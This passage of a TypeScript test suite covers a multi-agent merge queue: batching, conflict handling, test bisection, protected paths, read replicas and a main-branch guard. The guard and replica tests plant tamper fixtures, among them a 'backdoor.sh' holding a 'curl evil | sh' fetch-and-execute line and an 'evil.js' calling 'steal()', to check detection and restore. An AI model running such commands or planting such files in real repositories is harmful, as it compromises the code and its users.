    const b = await claimAndCommit(repo, wb, 'T2', { 'src/b.ts': 'export const b = 2;\n' });
    const pa = (await submit(repo, wa, 'T1', a)).patchId;
    const pb = (await submit(repo, wb, 'T2', b)).patchId;
    expect((await approve(repo, pa, [r1, r2])).body.status).toBe('queued');
    await drainQueue(repo);
    expect((await approve(repo, pb, [r1, r2])).body.status).toBe('queued');
    await drainQueue(repo);
    const s = await status(repo);
    expect(s.tasks.map((t: { status: string }) => t.status)).toEqual(['merged', 'merged']);
    expect(s.stats.staleMerges).toBe(0);
    expect(s.queue.fastForwards).toBe(0);
    expect(s.queue.batchCommits).toBe(2);
    const files = (await registry(repo).devMainFiles())!;
    expect(files['src/a.ts']).toBe('export const a = 1;\n');
    expect(files['src/b.ts']).toBe('export const b = 2;\n');
    expect(files['README.md']).toBeDefined();
  });

  it('a patch touching a file changed on main since its base is a conflict: stale, task freed', async () => {
    const repo = await setupRepo(['T1', 'T2']);
    const wa = await agent('w-c-a', 'worker', 'claude');
    const wb = await agent('w-c-b', 'worker', 'gemini');
    const r1 = await agent('r-c-1', 'reviewer', 'gpt-4o');
    const r2 = await agent('r-c-2', 'reviewer', 'mistral');
    const a = await claimAndCommit(repo, wa, 'T1', { 'shared.ts': 'version A\n' });
    const b = await claimAndCommit(repo, wb, 'T2', { 'shared.ts': 'version B\n', 'only-b.ts': 'b\n' });
    const pa = (await submit(repo, wa, 'T1', a)).patchId;
    const pb = (await submit(repo, wb, 'T2', b)).patchId;
    await approve(repo, pa, [r1, r2]);
    await drainQueue(repo);
    await approve(repo, pb, [r1, r2]);
    await drainQueue(repo);
    const s = await status(repo);
    const patchB = s.patches.find((p: { patchId: string }) => p.patchId === pb);
    expect(patchB.status).toBe('stale');
    expect(patchB.mergeError).toMatch(/^CONFLICT: shared\.ts/);
    expect(s.tasks.find((t: { id: string }) => t.id === 'T2').status).toBe('available');
    expect(s.tasks.find((t: { id: string }) => t.id === 'T2').conflicts).toBe(1); // the redo is counted on the task
    expect(s.tasks.find((t: { id: string }) => t.id === 'T1').conflicts).toBe(0);
    expect((await registry(repo).devMainFiles())!['shared.ts']).toBe('version A\n');
    expect((await registry(repo).devMainFiles())!['only-b.ts']).toBeUndefined();
  });

  it('each patch carries the times that make up its window: claim, submit, entry in the queue, close', async () => {
    const repo = await setupRepo(['T1', 'T2', 'T3']);
    const wa = await agent('w-ts-a', 'worker', 'claude');
    const wb = await agent('w-ts-b', 'worker', 'gemini');
    const wc = await agent('w-ts-c', 'worker', 'mistral');
    const r1 = await agent('r-ts-1', 'reviewer', 'gpt-4o');
    const r2 = await agent('r-ts-2', 'reviewer', 'mistral');
    const t0 = Date.now();
    const a = await claimAndCommit(repo, wa, 'T1', { 'shared.ts': 'version A\n' });
    const b = await claimAndCommit(repo, wb, 'T2', { 'shared.ts': 'version B\n' });
    const c = await claimAndCommit(repo, wc, 'T3', { 'c.ts': 'c\n' });
    const pa = (await submit(repo, wa, 'T1', a)).patchId;
    const pb = (await submit(repo, wb, 'T2', b)).patchId;
    const pc = (await submit(repo, wc, 'T3', c)).patchId; // never reviewed: still being evaluated
    // not reviewed yet: it has a claim and a submit time and no entry in the queue, no close
    const pending = (await status(repo)).patches.find((p: { patchId: string }) => p.patchId === pc);
    expect(typeof pending.claimedAt).toBe('number');
    expect(pending.queuedAt).toBeUndefined();
    expect(pending.closedAt).toBeUndefined();
    await approve(repo, pa, [r1, r2]);
    await drainQueue(repo);
    await approve(repo, pb, [r1, r2]);
    await drainQueue(repo);
    const t1 = Date.now();
    const s = await status(repo);
    for (const [id, expected] of [[pa, 'merged'], [pb, 'stale']] as const) {
      const p = s.patches.find((q: { patchId: string }) => q.patchId === id);
      expect(p.status).toBe(expected);
      for (const k of ['claimedAt', 'submittedAt', 'queuedAt', 'closedAt']) expect(typeof p[k], `${id} ${k}`).toBe('number');
      // in this order, all within the test
      expect(t0 <= p.claimedAt && p.claimedAt <= p.submittedAt && p.submittedAt <= p.queuedAt && p.queuedAt <= p.closedAt && p.closedAt <= t1).toBe(true);
    }
  });

  it('batching: N approved disjoint patches become ONE commit pushed once', async () => {
    const tasks = ['B1', 'B2', 'B3', 'B4', 'B5', 'B6'];
    const repo = await setupRepo(tasks);
    const r1 = await agent('r-b-1', 'reviewer', 'gpt-4o');
    const r2 = await agent('r-b-2', 'reviewer', 'gemini');
    const patches: string[] = [];
    for (const t of tasks) {
      const w = await agent(`w-${t}`, 'worker', 'claude');
      patches.push((await submit(repo, w, t, await claimAndCommit(repo, w, t, { [`pkg/${t}.ts`]: `export const ${t} = true;\n` }))).patchId);
    }
    for (const p of patches) expect((await approve(repo, p, [r1, r2])).body.status).toBe('queued');
    await drainQueue(repo);
    const s = await status(repo);
    expect(s.tasks.every((t: { status: string }) => t.status === 'merged')).toBe(true);
    expect(s.queue.pushes).toBe(1);
    expect(s.queue.batchCommits).toBe(1);
    expect(s.queue.largestBatch).toBe(tasks.length);
    expect(new Set(s.tasks.map((t: { mergedCommit: string }) => t.mergedCommit)).size).toBe(1);
    const files = (await registry(repo).devMainFiles())!;
    for (const t of tasks) expect(files[`pkg/${t}.ts`]).toBe(`export const ${t} = true;\n`);
  });

  it('inside one batch, the second patch touching the same file conflicts; the others still merge', async () => {
    const tasks = ['C1', 'C2', 'C3'];
    const repo = await setupRepo(tasks);
    const r1 = await agent('r-cb-1', 'reviewer', 'gpt-4o');
    const r2 = await agent('r-cb-2', 'reviewer', 'gemini');
    const files: Record<string, Record<string, string>> = { C1: { 'same.ts': 'one\n' }, C2: { 'same.ts': 'two\n' }, C3: { 'other.ts': 'three\n' } };
    const ids: string[] = [];
    for (const t of tasks) {
      const w = await agent(`w-${t}`, 'worker', 'claude');
      ids.push((await submit(repo, w, t, await claimAndCommit(repo, w, t, files[t]))).patchId);
    }
    for (const p of ids) await approve(repo, p, [r1, r2]);
    await drainQueue(repo);
    const s = await status(repo);
    const byTask = Object.fromEntries(s.patches.map((p: { taskId: string; status: string }) => [p.taskId, p.status]));
    expect(byTask).toEqual({ C1: 'merged', C2: 'stale', C3: 'merged' });
    expect(Object.fromEntries(s.tasks.map((t: { id: string; conflicts: number }) => [t.id, t.conflicts]))).toEqual({ C1: 0, C2: 1, C3: 0 });
    expect(s.queue.pushes).toBe(1);
  });

  it('rebase after a conflict: the agent rebuilds on the new main and the patch merges', async () => {
    const repo = await setupRepo(['T1', 'T2']);
    const wa = await agent('w-rb-a', 'worker', 'claude');
    const wb = await agent('w-rb-b', 'worker', 'gemini');
    const r1 = await agent('r-rb-1', 'reviewer', 'gpt-4o');
    const r2 = await agent('r-rb-2', 'reviewer', 'mistral');
    const a = await claimAndCommit(repo, wa, 'T1', { 'conf.ts': 'A\n' });
    const b = await claimAndCommit(repo, wb, 'T2', { 'conf.ts': 'B\n' });
    await approve(repo, (await submit(repo, wa, 'T1', a)).patchId, [r1, r2]);
    await drainQueue(repo);
    await approve(repo, (await submit(repo, wb, 'T2', b)).patchId, [r1, r2]);
    await drainQueue(repo);
    expect((await status(repo)).tasks.find((t: { id: string }) => t.id === 'T2').status).toBe('available');
    const again = await claimAndCommit(repo, wb, 'T2', { 'conf.ts': 'A\nB\n' }, { rebase: true });
    const sub = await submit(repo, wb, 'T2', again);
    expect(sub.baseCommit).not.toBe(b.claim.baseCommit);
    await approve(repo, sub.patchId, [r1, r2]);
    await drainQueue(repo);
    const s = await status(repo);
    expect(s.tasks.find((t: { id: string }) => t.id === 'T2').status).toBe('merged');
    expect(s.tasks.find((t: { id: string }) => t.id === 'T2').conflicts).toBe(1); // the count survives the merge
    expect((await registry(repo).devMainFiles())!['conf.ts']).toBe('A\nB\n');
  });

  it('merge outcomes are idempotent (at-least-once delivery)', async () => {
    const repo = await setupRepo();
    const w = await agent('w-idem', 'worker', 'claude');
    const r1 = await agent('r-idem-1', 'reviewer', 'gpt-4o');
    const r2 = await agent('r-idem-2', 'reviewer', 'gemini');
    const work = await claimAndCommit(repo, w, 'T1', { 'i.ts': 'i\n' });
    const pid = (await submit(repo, w, 'T1', work)).patchId;
    await approve(repo, pid, [r1, r2]);
    await drainQueue(repo);
    const replay = await shardFor(repo, 'T1').onMergeResult({ patchId: pid, shard: shardOf('T1', SHARDS), status: 'conflict', detail: 'replayed', at: Date.now() });
    expect(replay.applied).toBe(false);
    const t1 = (await status(repo)).tasks.find((t: { id: string }) => t.id === 'T1');
    expect(t1.status).toBe('merged');
    expect(t1.conflicts).toBe(0); // a replayed conflict outcome does not count
  });
});

describe('project tests on the composed tree (mock runner)', () => {
  const GATES = JSON.stringify({ test: { commands: ['node --test'], timeoutSec: 60 } });
  async function enableTests(repo: string, gates = GATES) {
    const r = await call('POST', `/api/repos/${repo}/dev-advance-main`, ADMIN, { files: { '.gitflare/gates.json': gates }, message: 'declare project tests' });
    expect(r.status, r.raw).toBe(200);
  }
  async function queuePatches(repo: string, files: Record<string, Record<string, string>>) {
    const r1 = await agent(`r-t1-${repo}`, 'reviewer', 'gpt-4o');
    const r2 = await agent(`r-t2-${repo}`, 'reviewer', 'gemini');
    const ids: Record<string, string> = {};
    for (const t of Object.keys(files)) {
      const w = await agent(`w-${t}-${repo}`, 'worker', 'claude');
      ids[t] = (await submit(repo, w, t, await claimAndCommit(repo, w, t, files[t]))).patchId;
    }
    for (const t of Object.keys(files)) expect((await approve(repo, ids[t], [r1, r2])).body.status).toBe('queued');
    return ids;
  }

  it('a failing patch is isolated by bisection and rejected with TESTS_FAILED; the rest merges', async () => {
    const tasks = ['K1', 'K2', 'K3', 'K4'];
    const repo = await setupRepo(tasks);
    await enableTests(repo);
    await queuePatches(repo, {
      K1: { 'src/k1.ts': 'export const k1 = 1;\n' },
      K2: { 'src/k2.ts': 'export const k2 = 2;\n' },
      K3: { 'src/k3.ts': 'export const k3 = 3; // @gf-test-fail\n' },
      K4: { 'src/k4.ts': 'export const k4 = 4;\n' },
    });
    await drainQueue(repo);
    const s = await status(repo);
    const byTask = Object.fromEntries(s.patches.map((p: { taskId: string; status: string }) => [p.taskId, p.status]));
    expect(byTask).toEqual({ K1: 'merged', K2: 'merged', K3: 'rejected', K4: 'merged' });
    expect(s.patches.find((p: { taskId: string }) => p.taskId === 'K3').mergeError).toMatch(/^TESTS_FAILED/);
    expect(s.tasks.find((t: { id: string }) => t.id === 'K3').status).toBe('available');
    expect(s.queue.testRejections).toBe(1);
    // [K1..K4] fails, [K1 K2] passes and lands, [K3] alone fails and is rejected, [K4] passes.
    expect(s.queue.testRuns).toBe(4);
    expect(s.queue.bisecting).toBeNull();
    const files = (await registry(repo).devMainFiles())!;
    expect(files['src/k3.ts']).toBeUndefined();
    for (const k of ['k1', 'k2', 'k4']) expect(files[`src/${k}.ts`]).toBeDefined();
  });

  it.each([
    { n: 8, culprit: 8, runs: 5 }, // all, first half lands, [5 6] lands, [7] lands, [8] alone rejected
    { n: 8, culprit: 1, runs: 5 }, // all, [1-4] fails, [1 2] fails, [1] alone rejected, [2-8] passes
    { n: 4, culprit: 4, runs: 4 },
  ])('bisection never re-tests what it already knows: $n patches, culprit #$culprit, $runs test runs', async ({ n, culprit, runs }) => {
    const tasks = Array.from({ length: n }, (_, i) => `B${i + 1}`);
    const repo = await setupRepo(tasks);
    await enableTests(repo);
    await queuePatches(repo, Object.fromEntries(tasks.map((t, i) => [t, { [`src/${t}.ts`]: `export const v = ${i};${i + 1 === culprit ? ' // @gf-test-fail' : ''}\n` }])));
    await drainQueue(repo);
    const s = await status(repo);
    for (const p of s.patches) expect(p.status, p.taskId).toBe(p.taskId === `B${culprit}` ? 'rejected' : 'merged');
    expect(s.queue.testRuns).toBe(runs);
    expect(s.queue.testRejections).toBe(1);
    expect(s.queue.bisecting).toBeNull();
  });

  it('two patches that pass alone but break together: the first lands, the second is rejected on top of it', async () => {
    const repo = await setupRepo(['P1', 'P2', 'P3']);
    await enableTests(repo);
    await queuePatches(repo, {
      P1: { 'src/a.ts': 'export const a = () => 1; // @gf-test-pair\n' },
      P2: { 'src/b.ts': 'export const b = () => a(); // @gf-test-pair\n' },
      P3: { 'src/c.ts': 'export const c = 3;\n' },
    });
    await drainQueue(repo);
    const s = await status(repo);
    const byTask = Object.fromEntries(s.patches.map((p: { taskId: string; status: string }) => [p.taskId, p.status]));
    expect(byTask.P1).toBe('merged');
    expect(byTask.P2).toBe('rejected');
    expect(byTask.P3).toBe('merged');
  });

  it('fail closed: an invalid test declaration stops every merge until it is fixed', async () => {
    const repo = await setupRepo(['F1']);
    await enableTests(repo, '{ not json');
    await queuePatches(repo, { F1: { 'src/f.ts': 'export const f = 1;\n' } });
    await drainQueue(repo);
    let s = await status(repo);
    expect(s.patches[0].status).toBe('queued');
    expect(s.queue.lastError).toMatch(/gates\.json is not valid JSON/);
    await enableTests(repo);
    await drainQueue(repo);
    s = await status(repo);
    expect(s.patches[0].status).toBe('merged');
    expect(s.queue.lastError).toBeNull();
  });

  it('agents cannot change the test declaration: .gitflare/ is a protected path', async () => {
    const repo = await setupRepo(['G1']);
    await enableTests(repo);
    const w = await agent('w-gates', 'worker', 'claude');
    const sub = await submit(repo, w, 'G1', await claimAndCommit(repo, w, 'G1', { '.gitflare/gates.json': JSON.stringify({ test: { commands: ['true'] } }) }));
    expect(sub.status).toBe('rejected');
  });

  it('repositories without a test declaration merge without running tests', async () => {
    const repo = await setupRepo(['N1']);
    const r1 = await agent('r-n1', 'reviewer', 'gpt-4o');
    const r2 = await agent('r-n2', 'reviewer', 'gemini');
    const w = await agent('w-n1', 'worker', 'claude');
    await approve(repo, (await submit(repo, w, 'N1', await claimAndCommit(repo, w, 'N1', { 'n.ts': 'n\n' }))).patchId, [r1, r2]);
    await drainQueue(repo);
    const s = await status(repo);
    expect(s.patches[0].status).toBe('merged');
    expect(s.queue.testRuns).toBe(0);
  });
});

describe('whoami', () => {
  it('identifies agents and the admin; rejects anonymous calls', async () => {
    const w = await agent('w-who', 'worker', 'Claude ');
    expect((await call('GET', '/api/whoami', w)).body).toMatchObject({ ok: true, admin: false, agentId: 'w-who', role: 'worker', modelFamily: 'claude' });
    expect((await call('GET', '/api/whoami', ADMIN)).body).toEqual({ ok: true, admin: true });
    expect((await call('GET', '/api/whoami')).status).toBe(401);
  });
});

describe('main guard', () => {
  const event = (type: string, repo: string, payload: Record<string, unknown> = {}) => ({
    type: `cf.artifacts.repo.${type}`,
    source: { type: 'artifacts.repo', namespace: 'gf-test', repoName: repo },
    payload,
    metadata: { accountId: 'x', eventSubscriptionId: 'y', eventSchemaVersion: 1, eventTimestamp: new Date().toISOString() },
  });
  async function deliver(bodies: unknown[]) {
    const batch = createMessageBatch('gf-events', bodies.map((body, i) => ({ id: `m${i}`, timestamp: new Date(), attempts: 1, body })));
    const ctx = createExecutionContext();
    await worker.queue!(batch, env as never);
    return getQueueResult(batch, ctx);
  }
  async function queuedPatch(repo: string, task: string, file: string) {
    const w = await agent(`w-g-${task}-${repo}`, 'worker', 'claude');
    const r1 = await agent(`r-g1-${task}-${repo}`, 'reviewer', 'gpt-4o');
    const r2 = await agent(`r-g2-${task}-${repo}`, 'reviewer', 'gemini');
    const pid = (await submit(repo, w, task, await claimAndCommit(repo, w, task, { [file]: `${task}\n` }))).patchId;
    expect((await approve(repo, pid, [r1, r2])).body.status).toBe('queued');
    return pid;
  }

  it('a foreign push reported by Artifacts freezes the merge queue until an admin accepts the new head', async () => {
    const repo = await setupRepo(['G1']);
    await queuedPatch(repo, 'G1', 'g1.txt');
    const res = await deliver([
      event('pushed', repo, { ref: 'refs/heads/main', before: '0'.repeat(40), after: 'e'.repeat(40), commits: [{ id: 'e'.repeat(40), message: 'sneaky', author: { email: 'mallory@x' }, committer: { email: 'mallory@x' } }] }),
      { not: 'an artifacts event' },
    ]);
    expect(res.explicitAcks.length).toBe(2);
    await drainQueue(repo);
    let s = await status(repo);
    expect(s.patches[0].status).toBe('queued');
    expect(s.guard).toMatchObject({ state: 'alert', alert: { kind: 'foreign-push', commits: [{ author: 'mallory@x' }] } });
    expect(s.queue.lastError).toMatch(/^MAIN_GUARD/);
    const w = await agent('w-not-admin', 'worker', 'claude');
    expect((await call('POST', `/api/repos/${repo}/guard`, w, { action: 'accept' })).status).toBe(401);
    expect((await call('POST', `/api/repos/${repo}/guard`, ADMIN, { action: 'accept' })).status).toBe(200);
    await drainQueue(repo);
    s = await status(repo);
    expect(s.patches[0].status).toBe('merged');
    expect(s.guard.state).toBe('ok');
  });

  it('main moved outside the queue (no event at all) is caught at the next round; restore puts it back and revokes write tokens', async () => {
    const repo = await setupRepo(['G2']);
    await queuedPatch(repo, 'G2', 'g2.txt');
    const reg = registry(repo);
    const good = (await reg.devMainFiles())!;
    await reg.mockOp('mintToken', [repo, 'write', 600]); // a write token minted behind the platform's back
    await reg.mockOp('commit', [repo, 'main', { 'backdoor.sh': 'curl evil | sh\n' }, 'tamper']);
    await drainQueue(repo);
    let s = await status(repo);
    expect(s.guard.alert.kind).toBe('head-moved');
    expect(s.patches[0].status).toBe('queued');
    const r = await call('POST', `/api/repos/${repo}/guard`, ADMIN, { action: 'restore' });
    expect(r.status, r.raw).toBe(200);
    expect(r.body.revokedWriteTokens).toBe(1);
    expect((await reg.devMainFiles())!['backdoor.sh']).toBeUndefined();
    expect(Object.keys((await reg.devMainFiles())!).sort()).toEqual(Object.keys(good).sort());
    await drainQueue(repo);
    s = await status(repo);
    expect(s.patches[0].status).toBe('merged');
    const files = (await reg.devMainFiles())!;
    expect(files['g2.txt']).toBe('G2\n');
    expect(files['backdoor.sh']).toBeUndefined();
  });

  it('a rollback to an earlier head the queue produced is caught on the push event itself, with no merge round', async () => {
    const repo = await setupRepo(['G4', 'G5']);
    await queuedPatch(repo, 'G4', 'g4.txt');
    await drainQueue(repo);
    await queuedPatch(repo, 'G5', 'g5.txt');
    await drainQueue(repo);
    const s0 = await status(repo);
    const first = s0.tasks.find((t: { id: string }) => t.id === 'G4').mergedCommit;
    expect(s0.guard.state).toBe('ok');
    await registry(repo).mockOp('setRef', [repo, 'main', first]); // main moved back, G5 silently undone
    await deliver([event('pushed', repo, { ref: 'refs/heads/main', after: first })]);
    const s = await status(repo);
    expect(s.queue.length).toBe(0); // nothing queued: no round would ever look
    expect(s.guard).toMatchObject({ state: 'alert', alert: { kind: 'head-moved', after: first } });
  });

  it("the queue's own pushes, read tokens and events for forks never raise an alert; a foreign write token does", async () => {
    const repo = await setupRepo(['G3']);
    await queuedPatch(repo, 'G3', 'g3.txt');
    await drainQueue(repo);
    const merged = (await status(repo)).tasks.find((t: { id: string }) => t.id === 'G3').mergedCommit;
    await deliver([
      event('pushed', repo, { ref: 'refs/heads/main', after: merged }),
      event('token.created', repo, { tokenId: 't-read', scope: 'read' }),
      event('pushed', `${repo}--a0123456789ab`, { ref: 'refs/heads/task/G3/1', after: 'c'.repeat(40) }),
      event('cloned', repo),
    ]);
    let s = await status(repo);
    expect(s.guard).toMatchObject({ state: 'ok', counts: { ownPushes: 1, clones: 1, foreignPushes: 0 } });
    await deliver([event('token.created', repo, { tokenId: 't-evil', scope: 'write' })]);
    s = await status(repo);
    expect(s.guard.alert.kind).toBe('foreign-write-token');
  });
});

describe('read replicas of main', () => {
  async function initWithMirrors(tasks: string[], shards: number, mirrors: number) {
    const repo = repoName();
    const r = await call('POST', `/api/repos/${repo}/init`, ADMIN, { tasks: tasks.map((id) => ({ id, title: id })), shards, mirrors });
    expect(r.status, r.raw).toBe(200);
    expect(r.body.mirrors).toBe(mirrors);
    return repo;
  }

  it('shards read from their replica; the queue brings every replica to the merged head', async () => {
    const repo = await initWithMirrors(['R1', 'R2'], 2, 2);
    let s = await status(repo);
    expect(s.mirrors.map((m: { name: string }) => m.name)).toEqual([`${repo}--m0`, `${repo}--m1`]);
    expect(s.mirrors.every((m: { current: boolean }) => m.current)).toBe(true);
    const w = await agent(`w-rep-${repo}`, 'worker', 'claude');
    const work = await claimAndCommit(repo, w, 'R1', { 'r1.txt': 'r1\n' });
    expect(work.claim.main.replica).toBe(`${repo}--m${shardOf('R1', 2) % 2}`);
    expect(work.claim.main.remote).toContain(`${repo}--m`);
    const r1 = await agent(`r-rep1-${repo}`, 'reviewer', 'gpt-4o');
    const r2 = await agent(`r-rep2-${repo}`, 'reviewer', 'gemini');
    await approve(repo, (await submit(repo, w, 'R1', work)).patchId, [r1, r2]);
    await drainQueue(repo);
    s = await status(repo);
    const merged = s.tasks.find((t: { id: string }) => t.id === 'R1').mergedCommit;
    expect(s.mirrors.map((m: { head: string }) => m.head)).toEqual([merged, merged]);
    expect(s.queue.mirrorSyncs).toBeGreaterThanOrEqual(2);
    const heads = await runInDurableObject(registry(repo), async (instance) => {
      const a = (instance as unknown as { artifacts: MockArtifactsLike }).artifacts;
      return [await a.head(`${repo}--m0`, 'main'), await a.head(`${repo}--m1`, 'main')];
    });
    expect(heads).toEqual([merged, merged]);
  });

  it('restore revokes the write tokens of main and of every replica', async () => {
    const repo = await initWithMirrors(['V1'], 1, 1);
    const reg = registry(repo);
    const mirror = `${repo}--m0`;
    await reg.mockOp('mintToken', [repo, 'write', 600]);
    await reg.mockOp('mintToken', [mirror, 'write', 600]); // a writer who could move the replica too
    await reg.mockOp('commit', [repo, 'main', { 'backdoor.sh': 'curl evil | sh\n' }, 'tamper']);
    const r = await call('POST', `/api/repos/${repo}/guard`, ADMIN, { action: 'restore' });
    expect(r.status, r.raw).toBe(200);
    expect(r.body.revokedWriteTokens).toBeGreaterThanOrEqual(2);
    expect(await reg.mockOp('activeTokens', [mirror, 'write'])).toBe(0);
    expect(await reg.mockOp('activeTokens', [repo, 'write'])).toBe(0);
    expect((await reg.devMainFiles())!['backdoor.sh']).toBeUndefined();
  });

  it('a tampered replica: its extra content shows in the diff, a base off main is refused, the next sync resets it', async () => {
    const repo = await initWithMirrors(['T1', 'T2', 'T3', 'T4'], 1, 1);
    const mirror = `${repo}--m0`;
    const reg = registry(repo);
    const r1 = await agent(`r-t1-${repo}`, 'reviewer', 'gpt-4o');
    const r2 = await agent(`r-t2-${repo}`, 'reviewer', 'gemini');
    const h0 = (await status(repo)).guard.expectedHead;
    // A. Replica moved on top of main's head: the platform diffs against main's head, so reviewers see evil.js.
    await reg.mockOp('commit', [mirror, 'main', { 'evil.js': 'steal()\n' }, 'tampered replica']);
    const wa = await agent(`w-ta-${repo}`, 'worker', 'claude');
    const a = await submit(repo, wa, 'T1', await claimAndCommit(repo, wa, 'T1', { 'ok.txt': 'fine\n' }));
    const diff = await call('GET', `/api/repos/${repo}/patches/${a.patchId}/diff`, r1);
    expect(diff.body.patch.changes.map((c: { path: string }) => c.path).sort()).toEqual(['evil.js', 'ok.txt']);
    // B. Main moves on (a clean merge), then the replica serves a base built on the old main.
    await reg.mockOp('setRef', [mirror, 'main', h0]);
    await new Promise((res) => setTimeout(res, 1100)); // the shard caches the replica head for 1 s
    const wb = await agent(`w-tb-${repo}`, 'worker', 'claude');
    const clean = await claimAndCommit(repo, wb, 'T2', { 'clean.txt': 'ok\n' });
    const wd = await agent(`w-td-${repo}`, 'worker', 'claude');
    const later = await claimAndCommit(repo, wd, 'T4', { 'later.txt': 'ok\n' }); // claimed from the clean replica
    await approve(repo, (await submit(repo, wb, 'T2', clean)).patchId, [r1, r2]);
    await drainQueue(repo);
    await reg.mockOp('setRef', [mirror, 'main', h0]);
    await reg.mockOp('commit', [mirror, 'main', { 'evil.js': 'steal()\n' }, 'tampered from an old main']);
    await new Promise((res) => setTimeout(res, 1100));
    const wc = await agent(`w-tc-${repo}`, 'worker', 'claude');
    const c = await claimAndCommit(repo, wc, 'T3', { 'c.txt': 'c\n' });
    const subC = await call('POST', `/api/repos/${repo}/submit`, wc, { taskId: 'T3', leaseEpoch: c.epoch, commitSha: c.sha });
    expect(subC.status).toBe(409);
    expect(subC.body.error).toBe('BASE_NOT_ON_MAIN');
    // C. The next merge round resets the replica onto main's head.
    await approve(repo, (await submit(repo, wd, 'T4', later)).patchId, [r1, r2]);
    await drainQueue(repo);
    const s = await status(repo);
    const merged = s.tasks.find((t: { id: string }) => t.id === 'T4').mergedCommit;
    const replica = await runInDurableObject(reg, async (instance) => {
      const art = (instance as unknown as { artifacts: MockArtifactsLike }).artifacts;
      const head = await art.head(mirror, 'main');
      return { head, files: art.filesOf(head!) };
    });
    expect(replica.head).toBe(merged);
    expect(replica.files['evil.js']).toBeUndefined();
    expect(s.mirrors[0].current).toBe(true);
  });

  it('the replica count is immutable and replicas are deleted with the repository', async () => {
    const repo = await initWithMirrors(['I1'], 1, 2);
    const again = await call('POST', `/api/repos/${repo}/init`, ADMIN, { tasks: [], shards: 1, mirrors: 3 });
    expect(again.status).toBe(409);
    expect(again.body.error).toBe('MIRRORS_IMMUTABLE');
    expect((await call('DELETE', `/api/repos/${repo}`, ADMIN)).body.done).toBe(true);
    const left = await runInDurableObject(registry(repo), async (instance) => {
      const repos = (instance as unknown as { artifacts: { repos: Map<string, unknown> } }).artifacts.repos;
      return [repos.has(`${repo}--m0`), repos.has(`${repo}--m1`), repos.has(repo)];
    });
    expect(left).toEqual([false, false, false]);
  });
});

interface MockArtifactsLike {
  head(repo: string, branch: string): Promise<string | null>;
  filesOf(commit: string): Record<string, string>;
}

describe('resource cleanup', () => {
  const forkRefs = (repo: string, fork: string) =>
    runInDurableObject(registry(repo), async (instance) => {
      const r = (instance as unknown as { artifacts: { repos: Map<string, { refs: Map<string, string> }> } }).artifacts.repos.get(fork.toLowerCase());
      return r ? [...r.refs.keys()].sort() : null;
    });

  it('branches of closed patches are deleted from the forks; open patches keep theirs; a second run deletes nothing', async () => {
    const repo = await setupRepo(['B1', 'B2', 'B3'], 1);
    const w = await agent(`w-br-${repo}`, 'worker', 'claude');
    const r1 = await agent(`r-br1-${repo}`, 'reviewer', 'gpt-4o');
    const r2 = await agent(`r-br2-${repo}`, 'reviewer', 'gemini');
    const fork = (await call('POST', `/api/repos/${repo}/join`, w)).body.fork.name;
    const merged = await submit(repo, w, 'B1', await claimAndCommit(repo, w, 'B1', { 'b1.txt': 'b1\n' }));
    const rejected = await submit(repo, w, 'B2', await claimAndCommit(repo, w, 'B2', { '.gitflare/gates.json': '{}' }));
    expect(rejected.status).toBe('rejected'); // protected path: closed at submit
    const open = await submit(repo, w, 'B3', await claimAndCommit(repo, w, 'B3', { 'b3.txt': 'b3\n' }));
    expect(open.status).toBe('evaluating');
    await approve(repo, merged.patchId, [r1, r2]);
    await drainQueue(repo);
    expect(await forkRefs(repo, fork)).toEqual(['main', 'task/B1/1', 'task/B2/1', 'task/B3/1']);
    const r = await call('POST', `/api/repos/${repo}/cleanup`, ADMIN, {});
    expect(r.status, r.raw).toBe(200);
    expect(r.body.branches).toMatchObject({ deleted: 2, failed: 0, remaining: 0 });
    expect(await forkRefs(repo, fork)).toEqual(['main', 'task/B3/1']);
    expect((await call('POST', `/api/repos/${repo}/cleanup`, ADMIN, {})).body.branches.deleted).toBe(0);
    expect((await status(repo)).stats.branchesDeleted).toBe(2);
  });

  it('the shard alarm cleans branches by itself after a patch closes', async () => {
    const repo = await setupRepo(['A1'], 1);
    const w = await agent(`w-al-${repo}`, 'worker', 'claude');
    const fork = (await call('POST', `/api/repos/${repo}/join`, w)).body.fork.name;
    await submit(repo, w, 'A1', await claimAndCommit(repo, w, 'A1', { '.gitflare/x.json': '{}' })); // rejected at submit
    expect(await runDurableObjectAlarm(shardFor(repo, 'A1', 1))).toBe(true);
    expect(await forkRefs(repo, fork)).toEqual(['main']);
  });

  it('a branch whose fork is gone is counted as missing, not as a failure, and is not retried', async () => {
    const repo = await setupRepo(['A1'], 1);
    const w = await agent(`w-gone-${repo}`, 'worker', 'claude');
    const fork = (await call('POST', `/api/repos/${repo}/join`, w)).body.fork.name;
    await submit(repo, w, 'A1', await claimAndCommit(repo, w, 'A1', { '.gitflare/x.json': '{}' })); // rejected at submit: closed, its branch is to clean
    await registry(repo).mockOp('deleteRepo', [fork]); // the fork is gone before the cleanup runs
    const r = await call('POST', `/api/repos/${repo}/cleanup`, ADMIN, {});
    expect(r.status, r.raw).toBe(200);
    expect(r.body.branches).toMatchObject({ deleted: 0, alreadyGone: 1, failed: 0, remaining: 0 });
    expect((await call('POST', `/api/repos/${repo}/cleanup`, ADMIN, {})).body.branches).toMatchObject({ deleted: 0, alreadyGone: 0, failed: 0, remaining: 0 });
  });

  it('a mock operation that fails comes back to the shard as data, and succeeds as a value', async () => {
    const repo = await setupRepo(['A1'], 1);
    const reg = registry(repo);
    const gone = await reg.mockOpResult('deleteRefs', [`${repo}--no-such-fork`, ['refs/heads/x']]);
    expect(gone.ok).toBe(false);
    expect(gone.ok === false && gone.message).toMatch(/Repository not found/);
    expect(await reg.mockOpResult('activeTokens', [repo, 'write'])).toEqual({ ok: true, value: 0 });
  });

  it('idle forks are deleted (dry run first), a fork a queued patch reads from is kept, shards forget deleted forks', async () => {
    const repo = await setupRepo(['I1', 'I2'], 1);
    const idle = await agent(`w-idle-${repo}`, 'worker', 'claude');
    const busy = await agent(`w-busy-${repo}`, 'worker', 'gemini');
    const active = await agent(`w-active-${repo}`, 'worker', 'mistral');
    const r1 = await agent(`r-i1-${repo}`, 'reviewer', 'gpt-4o');
    const r2 = await agent(`r-i2-${repo}`, 'reviewer', 'meta-llama');
    const idleFork = (await call('POST', `/api/repos/${repo}/join`, idle)).body.fork.name;
    await claimAndCommit(repo, idle, 'I1', { 'i1.txt': 'i\n' }); // the shard now caches idle's fork
    const busyFork = (await call('POST', `/api/repos/${repo}/join`, busy)).body.fork.name;
    await approve(repo, (await submit(repo, busy, 'I2', await claimAndCommit(repo, busy, 'I2', { 'i2.txt': 'i\n' }))).patchId, [r1, r2]); // queued
    await call('POST', `/api/repos/${repo}/join`, active);
    await runInDurableObject(registry(repo), async (instance) => {
